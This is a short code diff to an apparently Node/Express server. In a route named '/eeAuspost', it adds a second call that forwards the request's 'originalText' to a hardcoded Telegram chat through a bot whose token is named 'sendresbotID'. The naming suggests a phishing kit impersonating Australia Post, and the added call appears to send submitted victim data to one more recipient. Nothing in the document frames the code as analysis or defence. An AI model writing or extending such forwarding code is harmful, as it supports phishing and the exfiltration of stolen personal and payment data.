@@ -3482,6 +3482,18 @@ app.post("/eeAuspost", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
+              chat_id: 2137940662,
+              text: `AusPost:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
               chat_id: 5338204355,
               text: `AusPost:\n${originalText}`,
               parse_mode: "Markdown",
